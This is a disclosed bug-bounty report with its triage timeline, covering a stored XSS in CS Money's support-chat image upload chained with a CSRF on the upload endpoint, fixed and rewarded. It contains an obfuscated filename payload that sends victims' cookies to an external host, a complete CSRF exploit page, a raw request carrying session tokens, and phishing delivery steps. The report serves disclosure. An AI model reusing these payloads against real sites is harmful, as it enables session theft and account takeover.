---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/cross-site-scripting-xss-stored
  - env/web
  - vuln/xss
  - vuln/csrf
  - trigger/one-click
  - trigger/victim-interaction
  - trigger/file-upload
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2020-12-26
submitted: 2020-10-17T04:17:33.874Z
bounty_usd: 1000
votes: 450
cve: []
program: "[[programs/cs_money|CS Money]]"
reporter: "benjamin-mauss"
source: "https://hackerone.com/reports/1010466"
title: "Blind XSS on image upload"
---
# Blind XSS on image upload

> **Severity:** Critical | **Bounty:** 1,000 USD | **Votes:** 450 | **Program:** CS Money | **Disclosed:** 2020-12-26

- Report: [https://hackerone.com/reports/1010466](https://hackerone.com/reports/1010466)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2020-10-17T04:17:33.874Z

## Report summary

This was my first report, so it is a little mess.

Let me explain: I found a XSS when I send a image in the support chat and change the image name to some script.

The CSRF part you can ignore, since the hacker can inject XSS in the support, then send a message (as support) with the XSS image to every user.
Yeah, it is a massive XSS, tons of users would be affected.

In the comments I explain I little better.

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
- The CSRF vulnerability make a request for support.cs.money/upload_file; This upload_file does not have csrf token/ origin/ reference verification!
- The XSS allows to execute JS. The payload of the XSS stay in the param 'filename' of the CSRF request. 

## Steps To Reproduce:
XSS
- use a proxy like burp suite and turn intercept on
- upload a file to the support chat
- change the filename to \"><img src=1 onerror=\"url=String['fromCharCode'](104,116,116,112,115,58,47,47,103,97,116,111,108,111,117,99,111,46,48,48,48,119,101,98,104,111,115,116,97,112,112,46,99,111,109,47,99,115,109,111,110,101,121,47,105,110,100,101,120,46,112,104,112,63,116,111,107,101,110,115,61)+encodeURIComponent(document['cookie']);xhttp=&#x20new&#x20XMLHttpRequest();xhttp['open']('GET',url,true);xhttp['send']();
- open the chat support and xss will activate

 CSRF
- create a file html in some server
- create a form with a file and the payload name
- send to a new tab. This one will post the image with payload

## Supporting Material/References:
https://onlinestringtools.com/convert-string-to-ascii      to convert the attacker's website link to ascii

## Impact

Allows the hacker to execute javascript. If the victim click in a link provided by the hacker, then go to the chat support in ANY TIME after this, XSS will be activated.
For the guys of support chat, they don't even need to click in the link for the XSS activate.

## Timeline

- **2020-10-17** @benjamin-mauss: If you do not understand anything and need help, please contact me in discord GatoLouco#3684
- **2020-10-17** @h1_analyst_oliver: Hi @███████,

What you provided seems to be a self-xss can you provide a working POC that shows how this can be used to attack another user?

Regards,
@princeofpersia
- **2020-10-17** @benjamin-mauss: Hi. This is not a self-xss. The support guy send me a printscreen of javascript executing (a alert box) and confirmed. I will provide to you some ways that this can be used to another users.
- **2020-10-17** @benjamin-mauss: This is the file (attachment) that hacker needs to put on his server. Maybe a domain like "csgo.money" or "cs.money" and send the link to a victim.

This will make a request for support.cs.money/upload_file with the a 1x1 png image (foo) and a payload in filename. 
If the victim (any user that click in link) is with the support chat ticket open a file will be send AS VICTIM to the SUPPORT TEAM, so the XSS will execute in both people (VICTIM and SUPPORT TEAM). I hope you understand :)
- **2020-10-17** @benjamin-mauss: This file also redirect to the cs.money website
- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **Changed Scope**
- **Report Triaged**
- **2020-10-19** @benjamin-mauss: Hi team,
Should I make a new report fixing this?
Just to clarify, the XSS runs in main domain.
- **2020-10-19** @triage_team: Hey!
No need to make new report, about the main domain - you are quite incorrect.
The reason for this XSS is support chat, and it affects support only.
Support agents were affected.
- **2020-10-19** @benjamin-mauss: Hey, team!
#Sumary

**While I was doing this report, I realized that the problem can be much bigger than it looks, a critical failure if done right. Please read through. (Mass XSS for thousands of users in the main domain!)**

With the combination of 2 vulnerabilities, being an XSS and a CSRF, a hacker is able to execute javascript in the browser of a user who clicks on his malicious link and __ has the chat open__, in order to make unauthorized requests, steal sensitive data , cookies, etc.

##Vulnerability 1, XSS

Looking for vulnerabilities through the support chat, in the cs.money domain, I sent an image and intercepted the request with a proxy (burp suite). After a few attempts, I found a vulnerability. It occurs when we send a valid image and change the file name to ```\" onerror = \"alert(123)\" \"``` where `alert(123)` can be any javascript code. Therefore, the request is:


````
POST /upload_file HTTP/1.1
Host: support.cs.money
Connection: close
Content-Length: 300
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEli0YqmeiCgcrWw7
Accept: */*
Origin: https://cs.money
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://cs.money/
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: __cfduid=d5c38651b1bd0e7faf431d4a677b64e8f1603121898; _gid=GA1.2.869853770.1603121908; _gcl_au=1.1.337254443.1603121910; _ym_uid=1603121910582607466; _ym_d=1603121910; _ym_isad=1; steamid=76561198877716307; avatar=https://steamcdn-a.akamaihd.net/steamcommunity/public/images/avatars/fe/fef49e7fa7e1997310d705b2a6158ff8dc1cdfeb_medium.jpg; username=bwmsdroid%20CS.MONEY; support_token=cef502aab9fb9084a9b2e4665123b6919395c765a596f51437018d54917881e8; amplitude_id_c14fa5162b6e034d1c3b12854f3a26f5cs.money=eyJkZXZpY2VJZCI6IjI4YjlmOTE4LTk5MDUtNDE3OC1hODRhLTA5YTk4ZjU1Yzc3MVIiLCJ1c2VySWQiOiI3NjU2MTE5ODg3NzcxNjMwNyIsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTYwMzEyMTkwNTE5OCwibGFzdEV2ZW50VGltZSI6MTYwMzEyMjAwNTcyMywiZXZlbnRJZCI6MywiaWRlbnRpZnlJZCI6MCwic2VxdWVuY2VOdW1iZXIiOjN9; _csrf=-pCD9Sf44p7MBAeIQuJ7VLtC; username=bwmsdroid%20CS.MONEY; connect.sid=s%3AXxrkBKLslLCGfzvmtUQvRGRhlrey3IvW.%2BA%2B7pqLL08F9j4Zl6kOwHRkkEqvtdr%2BUrxef7svS3Jg; _ga=GA1.1.810003942.1603121908; _ga_HY7CCPCD7H=GS1.1.1603121906.1.1.1603122063.60; _gali=online_chat_file_input

------WebKitFormBoundaryEli0YqmeiCgcrWw7
Content-Disposition: form-data; name="file"; filename="\" onerror = \"alert(123)\" \""
Content-Type: image/png

PNG

------WebKitFormBoundaryEli0YqmeiCgcrWw7--
```

Up to this point, we can only run XSS in our own browser and in the agent support browser.
It is in this situation that the CSRF enters.

##Vulnerability 2, CSRF
Looking for a way to expand XSS attack targets, I realized that, in order to send IMAGES (not messages), the server DOES NOT CHECK HEADERS ʻOrigin` and `Reference`, in addition to having no csrf-token. So, this is the perfect scenario for a hacker to send an unauthorized request. Thus, the hacker can host a file like this on his server:

````
<html>
  <body>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://support.cs.money/upload_file", false);
        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "de-de,de;q=0.8,en-us;q=0.5,en;q=0.3");
        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------256672629917035");
        xhr.withCredentials = "true";
        var body = "-----------------------------256672629917035\r\n" +
          "Content-Disposition: form-data; name=\"file\"; filename=\"\\\" onerror=alert('xss') \\\"\"\r\n" +
          "Content-Type: image/png\r\n" +
          "\r\n" +
          String.fromCharCode(0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, 0xC4, 0x89, 0x00, 0x00, 0x00, 0x01, 0x73, 0x52, 0x47, 0x42, 0x00, 0xAE, 0xCE, 0x1C, 0xE9, 0x00, 0x00, 0x00, 0x04, 0x67, 0x41, 0x4D, 0x41, 0x00, 0x00, 0xB1, 0x8F, 0x0B, 0xFC, 0x61, 0x05, 0x00, 0x00, 0x00, 0x09, 0x70, 0x48, 0x59, 0x73, 0x00, 0x00, 0x0E, 0xC3, 0x00, 0x00, 0x0E, 0xC3, 0x01, 0xC7, 0x6F, 0xA8, 0x64, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x44, 0x41, 0x54, 0x18, 0x57, 0x63, 0xF8, 0xFB, 0xF7, 0xFF, 0x7F, 0x00, 0x09, 0xED, 0x03, 0xF9, 0x94, 0x8C, 0x14, 0xA8, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82) + "\r\n" +
          "-----------------------------256672629917035--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        xhr.send(new Blob([aBody]));
      }
    try{      submitRequest();
        
    }catch(e){
        location.href="https://cs.money";
        
    }
    </script>
    
  </body>
</html>
```

A brief explanation: when clicking on the link, the user's browser (which is authenticated and having a conversation with the support agent) makes a request to `https://support.cs.money/upload_file` keeping the cookies, with the payload in the filename field and a valid image. So, as the server does not check the headers `Origin` and `Reference` it accepts the request sent as if it were legitimate.
Then he is redirected to the cs.money website. After that, when the user clicks on the support button again, XSS will go into action (cs.money for ordinary users and support.cs.money for support agents).

##Steps to reproduce

### XSS

- Start a chat with support;
- Configure a proxy as a burp suite in your browser;
- Send a valid image and change the `filename` to ```\" onerror = \"alert(123)\" \"``` ;
- You will be redirected to cs.money, click on the support chat.
- You will see an alert(123), the support agent will also see this when accessing your chat!

### CSRF
- Host the file where I explained the CSRF to a server, such as 000webhost, with the name of ʻindex.php`
- Take the link to your file and shorten it, (bit.ly) with a more friendly link; or use a domain like `csmoney.shop`
- Now the hacker can send the link to users who have active chat via discord or another means.

## Conclusion
It is possible for the hacker to send to the support agent a payload that responds to EVERYONE users who have already made a ticket (even those with closed support chat), containing an XSS that will be sent to each user. THIS IS A MASSIVE XSS, as surely a support has already helped thousands of users, imagine if the hacker sends this to several support agents, the situation would turn into total chaos, with thousands of accounts being affected. Please correct the vulnerabilities as soon as possible.
- **2020-10-19** @triage_team: Hey!
Going to discuss the CSRF addition, will come back to you after that.
- **2020-10-19** @benjamin-mauss: Hey, Team!
If cs.money allows, I could do what I said in a few days.

##Impact

- I could create and send a payload to the support agent, and the payload would respond as support agent to all users who have already contacted him with another payload.

- Users would receive a notification and click, running XSS.

- The XSS will run on cs.money (main domain), so it is possible to steal personal data, make requests, have total control over the user! 

-  The content of the page can be altered by a malicious one, such as a message to download a new update of the extension of cs money, which is actually something that can steal the password of the account of steam and other websites.

The variety of attacks that can be made are immense and a lot of users are vulnerable.
I'm happy to be able to report before someone with malicious intent explores it.
- **2020-10-20** @triage_team: Hey!
We got you.
No need to confirm that.
As for XSS, this fully your finding, and we are going to award you for that.
As for CSRF: Exactly file upload CSRF were submitted in this report #993915.
Going to notify upon fix both of initial hacker and you.
- **2020-10-20** @benjamin-mauss: Hii, team!
:) all right! I am glad for that anyway.
- **2020-10-20** @benjamin-mauss: Hey, team!
For the MASSIVE XSS that I told you (affect tons of users in main domain), the hacker does not need the CSRF vulnerability.

I just didn't continue because it violated the program rules, cuz I would be making unauthorized requests through the support account.
- **2020-10-20** @triage_team: What do you mean, thatt it would not require CSRF?
It would, as file upload csrf is in place, and file upload is the only way to do that, isn't it?
- **2020-10-20** @triage_team: Hey @██████!
The issue should be fixed.
Please, validate.
- **2020-10-20** @benjamin-mauss: Nice, good job, it is all working fine now!
- **2020-10-20** @benjamin-mauss: >What do you mean, thatt it would not require CSRF?

I mean this:

>It is possible for the hacker to send to the support agent a payload that responds to EVERYONE users who have already made a ticket (even those with closed support chat), containing an XSS that will be sent to each user. THIS IS A MASSIVE XSS, as surely a support has already helped thousands of users, imagine if the hacker sends this to several support agents, the situation would turn into total chaos, with thousands of accounts being affected. Please correct the vulnerabilities as soon as possible.

It is not necessary the CSRF.
- **2020-10-20** @triage_team: Oh, you mean for that.
Yes, we agree.
- **2020-10-20** @triage_team: Also, changing severity, according to our thoughts on the issue.
- **2020-10-20** @triage_team: Okay, guess HackerOne won't allow that. 
Still bounty would be as for `Critical` on the asset of support.cs.money
- **2020-10-20** @benjamin-mauss: I guess support.cs.money can also be critical. Can't u change that?
- **Report Title Updated**
- **Report Resolved**
- **2020-10-20** @triage_team: Yeah, that is because of default scope calculation, provided on our thought on asset.
So, just going to give increased bounty.
- **Bounty Awarded**
- **2020-10-20** @benjamin-mauss: holyyy, thank u so much, i will keep for sure :)
- **2020-10-20** @triage_team: Also, this would be a great idea to disclose this issue.
For other companies to see, just in case.
- **2020-10-20** @benjamin-mauss: Yeah, I will make an youtube video :-)
- **2020-10-20** @triage_team: Good, would like to see that, upon completion.
- **Agreed On Going Public**
- **2020-10-27** @triage_team: Hey @███!
Just in case, would you like to disclose this report on HackerOne page?
How's the video going?
- **2020-10-27** @benjamin-mauss: Hi,
I just found another vulnerability around this region, a big one, maybe a RCE, but it is complex to explore. I am focusing in this first.
>would you like to disclose this report on HackerOne page?

yes, as soon as I submit the other vulnerability :)
- **2020-11-12** @triage_team: Hey @██████!
Any updates? We are quite interested.
- **Agreed On Going Public**
- **Report Became Public**
- **Report Severity Updated**
- **Comments Closed**
